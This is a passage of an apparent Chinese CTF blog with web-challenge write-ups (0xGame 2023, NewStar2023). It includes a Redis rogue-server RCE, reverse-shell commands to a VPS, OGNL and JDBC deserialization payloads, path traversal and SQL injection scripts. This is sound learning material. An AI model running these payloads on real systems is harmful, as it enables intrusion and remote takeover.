num\n\nprint(rv)\n```\n\n直接反弹shell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599162719-3cedc115-53ec-4189-a3dd-c270b67a30c6.png)\n\n拿下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599180240-36084f24-009a-4ce6-9924-a6b4034ae184.png)\n\n## [Week 3] zip_file_manager\n\n考点：\n\n- 软链接\n\n直接通过软链接将根目录下的flag勾出来\n\n```javascript\nln -s /flag  test\nzip --symlinks test.zip ./test\n```\n\n## [Week 3] web_snapshot\n\n考点：\n\n- redis主从复制\n- ssrf\n- gopher协议\n\n主要源码如下：\n\nindex.php\n\n```javascript\n<?php\nerror_reporting(0);\n\nfunction _get($url) {\n    $curl = curl_init();\n    curl_setopt($curl, CURLOPT_URL, $url);\n    curl_setopt($curl, CURLOPT_HEADER, 0);\n    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\n    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);\n    $data = curl_exec($curl);\n    curl_close($curl);\n    return $data;\n}\n\nfunction process() {\n    $redis = new Redis();\n    $redis->connect('db', 6379);\n    $redis->slaveOf();\n\n    if (isset($_POST['url'])) {\n        $url = $_POST['url'];\n\n        if (!preg_match('/^https?:\\/\\/.*$/', $url)) {\n            return '<div class=\"alert alert-danger\">Invalid URL! The URL must start with <code>http://</code> or <code>https://</code></div>';\n        }\n\n        $id = md5($url.time());\n        $data = _get($url);\n        $redis->setEx($id, 600, $data);\n\n        return '<div class=\"alert alert-success\">Snapshot success! Link: <a href=\"cache.php?id='.$id.'\">cache.php?id='.$id.'</a></div><h2>Source</h2><pre><code class=\"language-html\">'.htmlspecialchars($data).'</code></pre>';\n    }\n}\n?>\n```\n\nping.php\n\n```javascript\n<?php\nerror_reporting(0);\n\n$redis = new Redis();\n$redis->connect('db', 6379);\n$redis->slaveOf();\n\nif ($redis->ping()) {\n    echo 'pong';\n} else {\n    echo 'Connection error';\n}\n?>\n```\n\ncache.php\n\n```javascript\n<?php\nerror_reporting(0);\n\n$id = $_GET['id'];\n\nif (!preg_match('/^[a-f0-9]{32}$/', $id)) {\n    die('Invalid ID');\n}\n\n$redis = new Redis();\n$redis->connect('db', 6379);\n$redis->slaveOf();\n\n$data = $redis->get($id);\n\nif ($data) {\n    echo $data;\n} else {\n    die('No snapshot found!');\n}\n?>\n```\n\n简单审计就能看到index.php中存在ssrf 并且限制了只能以http/https协议\n\n当然curl除了http/https协议外还支持dict/gopher协议\n\n再来看`curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018226430-3410ab03-23a4-4712-85ae-d877557cdeb5.png)\n\n当其被设置为true时 会根据服务器http头中的location进行重定向\n\n二者结合起来 我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher\n\n再审计cache.php和ping.php可知 web服务和redis服务不在一个服务器上\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699018653945-607c1987-eeb6-425d-a26f-f9f4ac81ed90.png)\n\n这就导致我们没法直接通过写入文件getshell\n\n那么就要利用到redis主从复制了 参考：[Redis 基于主从复制的 RCE 利用方式](https://paper.seebug.org/975/)\n\nRedis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。\n\n通过slave of设置主从状态\n\n（偷的图）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699019249350-3254f8ce-2e21-4b7f-aea9-910c889e9878.png)\n\n可以看到在主机修改值之后会同步到从机上\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699019683190-a07767fc-c9eb-4ebf-b931-66498429afc1.png)\n\n利用原理：\n\n当两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上\n\n然后我们可以利用从机加载so文件，我们就可以执行拓展的新命令了\n\n整个流程图如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699020700294-a7f0ea3e-324f-4a9c-b88f-3127d90dc3fc.png)\n\n首先先生成重定向恶意文件\n\n```javascript\nimport urllib.parse\npoc1= ''' HTTP/1.1\nSLAVEOF ip port\nCONFIG SET dbfilename exp.so\n'''\n#SLAVEOF设置主服务器 我们自己的恶意服务器\n#CONFIG SET dbfilename为指定保存文件名\npoc2=''' HTTP/1.1\nMODULE LOAD ./exp.so\nsystem.rev 123 123\n'''\n#module load ./1.so 加载恶意文件\n# system.rev后面被Aecous师傅魔改了，因为弹不了shell，正常使用就是ip port\npayload = urllib.parse.quote(poc1).replace(\"%0A\", \"%0D%0A\")\npayload = \"gopher://db:6379/\" + payload\nprint(payload)\n```\n\n在vps起个php文件用`php -S 0.0.0.0:port`或者用nginx，apache都行\n\n让题目去依次访问这两个文件\n\n再起个恶意redis server 推荐：[GitHub - Testzero-wz/Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)\n\n 恶意Server使用，-v为恶意Server模式，指定port和恶意文件开启监听  \n\n```\n python3 redis_rogue_server.py -v -lport 8888 -path exp.so  \n```\n\n这里恶意so文件由Aecous师傅完成的真的tql\n\n魔改RedisModulesSDK/exp/exp.c一个函数，make编译后生成exp.so文件  项目地址：https://github.com/vulhub/redis-rogue-getshell\n\n魔改内容为：\n\n```javascript\nint RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n\tif (argc == 3) {\n\t\tsize_t cmd_len;\n\t\tchar *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);\n\t\tchar *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);\n\t\tint port = atoi(port_s);\n        int pid;\n\t\tchar * succ= \"+OK\";\n\t\tpid = fork();\n\t\tif (pid || pid == -1){\n            RedisModuleString *ret = RedisModule_CreateString(ctx, succ, strlen(succ));\n            RedisModule_ReplyWithString(ctx, ret);\n\t\t    RedisModule_FreeString(ctx,ret);\n\t\t\treturn REDISMODULE_OK;\n\t\t}\n\t\t\n\t\tsystem(\"nc ip port -e sh\");\n\n\t\treturn REDISMODULE_OK;\n\n\t} else {\n                return RedisModule_WrongArity(ctx);\n        }\n    return REDISMODULE_OK;\n}\n```\n\n起server\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021626577-a776f61a-fa6b-459b-93eb-206490ce58ee.png)\n\n访问1.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021727894-8443bd61-ea91-4f7b-b794-326911629959.png)\n\n恶意服务器会持续通信写入  之前代码没有加quit的话 会一直写入 一次就可以exit出来了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699021678146-2a4ed6cb-e8f0-42b8-96f1-15908af21cca.png)\n\n然后访问2.php 加载恶意so文件 反弹shell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022532071-31554092-63af-4ced-b948-1c312836ed7b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022511568-6c0c449b-443d-4723-bc5d-2855c88e7311.png)\n\n## [Week 3] GoShop\n\n考点：\n\n- 整数溢出\n\n```javascript\nfunc BuyHandler(c *gin.Context) {\n\ts := sessions.Default(c)\n\tuser := users[s.Get(\"id\").(string)]\n\n\tdata := make(map[string]interface{})\n\tc.ShouldBindJSON(&data)\n\n\tvar product *Product\n\n\tfor _, v := range products {\n\t\tif data[\"name\"] == v.Name {\n\t\t\tproduct = v\n\t\t\tbreak\n\t\t}\n\t}\n\n\tif product == nil {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"No such product\",\n\t\t})\n\t\treturn\n\t}\n\n\tn, _ := strconv.Atoi(data[\"num\"].(string))\n\n\tif n < 0 {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"Product num can't be negative\",\n\t\t})\n\t\treturn\n\t}\n\n\tif user.Money >= product.Price*int64(n) {\n\t\tuser.Money -= product.Price * int64(n)\n\t\tuser.Items[product.Name] += int64(n)\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": fmt.Sprintf(\"Buy %v * %v success\", product.Name, n),\n\t\t})\n\t} else {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"You don't have enough money\",\n\t\t})\n\t}\n}\n```\n\n这里直接看官方WP吧 [0xGame 2023 Web Official Writeup](https://exp10it.cn/2023/11/0xgame-2023-web-official-writeup/#goshop)\n\n本人乱点出的qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699022685784-17eab509-7c76-46b8-a5bd-08c61069fd8e.png)\n\n# WEEK4\n\n## [Week 4] spring(学习)\n\n考点：\n\n- Spring Boot Actuator未授权 headdump泄露\n\n> Actutator是一个生产环境部署时可使用的功能，用来监控和管理应用程序。支持选择HTTP Endpoints 或者JMX的方式来访问，同样支持查看应用程序的Auding,health和metrics信息。\n\n首先访问`/actuator/env `查看环境变量发现flag是密码 密码被改为星号了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847740633-7aee6a12-a838-4b4c-8942-1c94351320e3.png)\n\n访问`/actuator/headdump` \n\nspring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防⽌敏感信息泄露 但是我们可以通过 /actuator/heapdump 这个路由去导出 jvm 中的堆内存信息, 然后通过⼀定的查询得到 app.password 的明文\n\n这里我用的是MAT工具[Eclipse Memory Analyzer Open Source Project | The Eclipse Foundation](https://eclipse.dev/mat/)\n\n查询语句：\n\n```\nSELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains(\"app.password\"))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698847993233-e8c26d8f-cb19-477c-aaa6-f133fbcfc399.png)\n\n## [Week 4] auth_bypass(学习)\n\n考点：\n\n- Tomcat Filter绕过+java任意文件下载搭配WEB-INF目录利用\n\n源码如下：\n\nAuthFilter.java\n\n```javascript\npackage com.example.demo;\n\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport java.io.IOException;\n\npublic class AuthFilter implements Filter {\n\n    @Override\n    public void init(FilterConfig filterConfig)  {\n    }\n\n    @Override\n    public void destroy() {\n    }\n\n    @Override\n    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) req;\n\n        if (request.getRequestURI().contains(\"..\")) {\n            resp.getWriter().write(\"blacklist\");\n            return;\n        }\n\n        if (request.getRequestURI().startsWith(\"/download\")) {\n            resp.getWriter().write(\"unauthorized access\");\n        } else {\n            chain.doFilter(req, resp);\n        }\n    }\n}\n```\n\nDownloadServlet.java\n\n```javascript\npackage com.example.demo;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class DownloadServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n\n        String currentPath = this.getServletContext().getRealPath(\"/assets/\");\n        Object fileNameParameter = req.getParameter(\"filename\");\n        if (fileNameParameter != null) {\n            String fileName = (String) fileNameParameter;\n            resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+fileName);\n            try (FileInputStream input = new FileInputStream(currentPath + fileName)) {\n                byte[] buffer = new byte[4096];\n                while (input.read(buffer) != -1) {\n                    resp.getOutputStream().write(buffer);\n                }\n            }\n        } else {\n            resp.setContentType(\"text/html\");\n            resp.getWriter().write(\"<a href=\\\"/download?filename=avatar.jpg\\\">avatar.jpg</a>\");\n        }\n    }\n}\n```\n\n简单审计就是一个文件读取的功能 并且有blacklist\n\n首先如何绕过blacklist `..`和关键字`/download`\n\n这里利用了java中 getRequestURI()  的缺陷 这个函数在解析url时不会自动进行url解码 也不会进行标准化 (去除多余的`/和..`)\n\n参考：[getRequestURI 导致的安全问题 - depycode - 博客园](https://www.cnblogs.com/depycode/p/16124191.html)\n\n 以直接访问 `//download `就能绕过 \n\n之后目录穿越下载文件的时候可以将`..` 进行⼀次 url 编码 就能绕过\n\n所以可以通过 `//download?filename=文件 `来读取文件 这道题目需要`./readflag`因此不能直接将flag读出来\n\n根据题目描述 网站使用war打包 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698850966288-8e5b064d-bdd6-4201-9fbf-a507555dfebd.png)\n\nTomcat 在部署 war 的时候会将其解压, ⽽压缩包内会存在⼀个 WEB-INF ⽬录, ⽬录⾥⾯包含编译好的 .class ⽂件以及 web.xml (保存路由和类的映射关系 ）\n\n下载web.xml \n\n```\n//download?filename=%2e%2e/WEB-INF/web.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <servlet>\n        <servlet-name>IndexServlet</servlet-name>\n        <servlet-class>com.example.demo.IndexServlet</servlet-class>\n    </servlet>\n    <servlet>\n        <servlet-name>DownloadServlet</servlet-name>\n        <servlet-class>com.example.demo.DownloadServlet</servlet-class>\n    </servlet>\n    <servlet>\n        <servlet-name>EvilServlet</servlet-name>\n        <servlet-class>com.example.demo.EvilServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>IndexServlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n    <servlet-mapping>\n        <servlet-name>DownloadServlet</servlet-name>\n        <url-pattern>/download</url-pattern>\n    </servlet-mapping>\n    <servlet-mapping>\n        <servlet-name>EvilServlet</servlet-name>\n        <url-pattern>/You_Find_This_Evil_Servlet_a76f02cb8422</url-pattern>\n    </servlet-mapping>\n    \n    <filter>\n        <filter-name>AuthFilter</filter-name>\n        <filter-class>com.example.demo.AuthFilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>AuthFilter</filter-name>\n        <url-pattern>/*</url-pattern>\n    </filter-mapping>\n</web-app>\n```\n\n可以看到EvilServlet类的`/You_Find_This_Evil_Servlet_a76f02cb8422`路由\n\n 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载  \n\n```\n //download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class  \n```\n\n再利用JD-GUI工具进行反编译打开\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851238943-8816e84f-6fd8-4cbc-aae1-3b4f8fca29f1.png)\n\n发现命令执行利用点\n\n利用这个工具生成paylaod [java.lang.Runtime.exec() Payload Workarounds - @Adminxe](https://www.adminxe.com/tools/code.html)\n\n记得post打入的时候url全字符编码一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851481677-b3dfcc4a-c183-4962-bef1-09eff8959608.png)\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698851514653-3583acc0-72de-445b-b3ac-02fcbd63e7b7.png)\n\n\n\n## [Week 4] YourBatis(学习)\n\n考点：\n\n- MyBatis低版本OGNL注入\n-  OGNL 表达式注入\n\n首先将给的jar包进行反编译 在idea打开\n\n首先查看依赖 发现存在MyBatis依赖 并且是低版本2.1.1 该版本存在OGNL表达式注入\n\n之后开个篇章学习一下 WP就不过多赘述了\n\n推荐：[奇安信攻防社区-从一道CTF题浅谈MyBatis与Ognl的那些事](https://forum.butian.net/share/1749)[Mybatis 从SQL注入到OGNL注入 - panda | 热爱安全的理想少年](https://www.cnpanda.net/sec/1227.html)\n\n存在一个/user路由 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699177350194-f8a3b765-c6f6-43ac-a960-ba1e8243dda6.png)\n\n主要代码如下\n\n```javascript\n//\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\npackage com.example.yourbatis.provider;\n\nimport org.apache.ibatis.jdbc.SQL;\n\npublic class UserSqlProvider {\n    public UserSqlProvider() {\n    }\n\n    public String buildGetUsers() {\n        return (new SQL() {\n            {\n                this.SELECT(\"*\");\n                this.FROM(\"users\");\n            }\n        }).toString();\n    }\n\n    public String buildGetUserByUsername(final String username) {\n        return (new SQL() {\n            {\n                this.SELECT(\"*\");\n                this.FROM(\"users\");\n                this.WHERE(String.format(\"username = '%s'\", username));\n            }\n        }).toString();\n    }\n}\n```\n\n可以看到username直接被拼接进了查询语句 因此这里就存在sql注入 更严谨应该是OGNL表达式注入\n\n直接利用OGNL表达式命令执行反弹shell\n\n```javascript\n${@java.lang.Runtime@getRuntime().exec(\"bash -c\n{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-\nd}|{bash,-i}\")}\n```\n\n\n\n无法进行反弹shell 因为传入的内容包含`{和}`会被递归解释为另一个OGNL表达式的开头与结尾\n\n官方wp是利用OGNL 调用Java 自身的 base64 decode方法\n\n```javascript\n${@java.lang.Runtime@getRuntime().exec(new\njava.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzg0TGpFek1DNHpOQzQxTXk4M056YzNJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9')))}\n```\n\njava基础知识还是缺少很多 得去狂补\n\n## [Week 4] TestConnection（学习）\n\n考点：\n\n-  MySQL / PostgreSQL JDBC URL Attack  \n\n### 解法一 \n\n直接看官方WP\n\n> JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问\n>\n> JDBC URL 就是用于连接数据库的字符串, 格式为 jdbc:db-type://host:port/db-name?param=value\n>\n> db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite\n>\n> db-name 是要使用的数据库名\n>\n> param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等\n>\n> 当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE\n\n看看依赖\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186012686-7dcd51eb-5b46-4a88-87ec-b6c194602a72.png)\n\n根据mysql版本8.0.11 找到对应的驱动利用 [MYSQL JDBC反序列化解析 - 跳跳糖](https://tttang.com/archive/1877/#toc_)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699186082246-dff3269f-5cf5-4f74-8ccc-970c455b1052.png)\n\n或者用工具生成payload[GitHub - 4ra1n/mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用)](https://github.com/4ra1n/mysql-fake-server)\n\n注意这里选用的CC6的链子 这也就是为什么要给依赖让我们知道是`commons-collections-3.2.1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190566032-86255c59-cffd-4d1d-a011-01a2973cec93.png)\n\n```\njdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CC31_bash -i >& /dev/tcp/ip/port 0>&1\n```\n\n这里需要知道`jdbc:mysql://ip:port/test`这里的ip port是我们在vps起的恶意MySQL服务 也是用这个工具的cli版本即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699190663630-b94fa85c-45be-411f-b962-e52f1045be1d.png)\n\n除此之外 题目中给的代码是 `DriverManager.getConnection(url, username, password);`\n\n即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖\n\n所以我们用工具生成的payload中user部分要改为username\n\n```\njdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -i >& /dev/tcp/ip/port 0>&1\n```\n\n当然这样还是不行\n\n要将之后的命令执行部分改为适合java的payload`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}`\n\n即`jdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}`\n\n至于drive的由来 问了一下GPT 是默认固定的路径\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191288102-7c8a37c4-2f70-4b11-b10c-72b1b6707d10.png)\n\n因此最终payload的为：记得要url编码打入\n\n```javascript\n/testConnection?\ndriver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://8.130.34.53:3308/testConnection?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4zNC41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}&password=123\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191420960-8bf11182-5e45-4fa4-8383-5dca1f83430f.png)\n\n连接我们的恶意mysql服务成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191454720-589f9452-830f-42fc-8777-cb0227d236d7.png)\n\n反弹shell成功![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699191477892-9a92d92d-961a-427e-bd65-5bf097d37027.png)\n\n### 解法二 利用 postgresql 驱动\n\n还是利用那个项目工具\n\n生成payload![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1699193586740-2cb7093a-9f9a-4065-9845-6479c886f899.png)\n\n此时ip和port应该是postgresql的服务而不是mysql\n\n```\njdbc:postgresql://ip:port/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=xml文件访问地址\n```\n\n然后xml内容参考[PostgresQL JDBC Drive 任意代码执行漏洞(CVE-2022-21724) - 先知社区](https://xz.aliyun.com/t/11812)\n\n用http起一个服务 开放这个xml文件访问\n\n最终payload：\n\n```\n/testConnection?driver=jdbc:postgresql://ip:port/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=xml文件访问地址&username=123&password=123\n```\n\n# 结尾\n\njava还是一窍不通 :( 只能硬着头皮复现了\n","categories":["各赛事WP"]},{"title":"NewStar2023 WEB WP","url":"/post/dcc8a51b.html","content":"\n小阶段完成\n\n<!--more-->\n\n# 前言\n\n经过五周的比赛，恭喜NewStar2023(校内赛道)圆满结束了 *★,°*:.☆(￣▽￣)/$:*.°★* 。\n\n这里是Z1d10t的WEB方向题解\n\n3题未解出 还是太菜了qwq \n\n日后会更加努力！\n\n# WEEK1\n\n## ErrorFlask\n\n报错之后能看到是flask框架的 然后就能得到源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620310236-6bbb4213-7832-4c9e-9cb6-972e12f682a9.png)\n\n## Begin of HTTP\n\n正常考察请求头参数\n\n# ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695620090015-6e93ad0d-5ec6-45c3-bfb9-f7aee7d97337.png)\n\n## Begin of Upload\n\n前端检测绕过\n\n## 泄漏的秘密\n\n/www.zip源码泄露\n\n## Begin of PHP\n\nget：`?key1[]=1&key2[]=2&key4[]=4&key5=2024%00`\n\npost：`key3[]=3&flag5[]=1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695617294020-eb01d6c9-c990-44a4-83a4-c33e9eb85046.png)\n\n## R!C!E!\n\n```\npassword=114514&e[v.a.l=var_dump(shell_exec('more /f*'));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695616213122-0044da95-b172-405b-a1c9-c98cee6536c7.png)\n\n## EasyLogin\n\n爆破的时候会获得一条一条的提示 \n\n```php\n The password is randomly selected from a list\n\n 这个密码恰如题目简介，一分不多，一分不少\n\nIs your password weak?\n```\n\n一开始一直以为 `这个密码恰如题目简介，一分不多，一分不少`的意思是密码9位 但是之后和出题人聊了之后 和这个根本没关系 只想表达是弱口令密码 \n\n密码是000000 当然记得要通过md5加密之后再爆破\n\n登录然后放掉这个包 然后还会跳转到一个包 就能获得密码 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695629472388-c783f834-6097-4b10-bd61-f366c4983399.png)\n\n# WEEK2\n\n## 游戏高手\n\n修改得分即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696172672213-98b769f1-a424-4a00-a451-3095c4137adb.png)\n\n## ez_sql\n\n手动注个jb sqlmap一把梭就行了\n\n```java\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 --dbs\n[*] ctf\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] sys\n[*] test\n\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf --tables\n grades       |\n| here_is_flag\n\n\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag --columns\n flag   | varchar(255) \n\n\nsqlmap -u http://90770cb7-62be-4275-af63-238c7fe26d62.node4.buuoj.cn:81/?id=1 -D ctf -T here_is_flag -C \"flag\" --dump\n```\n\n## Upload again!\n\n考点：\n\n- htaccess\n\n很基础\n\n## Unserialize？\n\n考点:\n\n- php反序列化\n\n```java\n<?php\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd='nl /th1s_1s_fffflllll4444aaaggggg';\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n$a = new evil();\necho urlencode(serialize($a));\n?>\n#O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A33%3A%22nl+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D\n```\n\n## include 0。0\n\n禁了base所以不能用常用的base64转码了 换种转码方式\n\n```\n?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171708476-0624b883-3c25-461c-8127-7f163a4bab2e.png)\n\n再解码\n\n```java\n<?php\n$str = \"?<hp p//lfga5{719c28-e567c4-d9-1dab5e-7c6326be71}9\";\necho iconv('UCS-2BE', 'UCS-2LE', $str);\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696171733094-68be6a56-67e1-45ab-88fa-8df2ea9eb0ad.png)\n\n## R!!C!!E!!\n\n考点:\n\n- git泄露\n- 无参rce\n\n首先获得源码 得到`/bo0g1pop.php`路由\n\n得到源码\n\n```java\n<?php\nhighlight_file(__FILE__);\nif (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) {\n    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){\n        eval($_GET['code']);\n    }\n}\nGET /bo0g1pop.php?star=system(next(getallheaders())); HTTP/1.1\nHost: 18e0aabc-695f-46fd-b4e2-3557e66a3cdc.node4.buuoj.cn:81\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: cat /flag\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA\nConnection: close\n```\n\n利用User-Agent字段进行构造rce\n\n# WEEK3\n\n## medium_sql\n\n考察：\n\n- sql盲注\n\n直接sqlmap level3梭哈或者自己写个脚本（沙贝是自己）\n\npoc:\n\n```java\nimport requests\nimport time\nurl = 'http://3984f01f-9843-4df0-a21f-95a7eff68063.node4.buuoj.cn:81/'\nresult=''\nfor i in range(1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        paylaod = \"TMP0929'And/**/0^(Ascii(Substr((Select(flag)from(ctf.here_is_flag)),{},1))>{})%23\".format(i,mid)\n        #爆库爆数据语句差不多 关键字被ban大写绕过就行\n        r = requests.get(url+\"?id=\"+paylaod)\n        if (\"English\" in r.text):\n            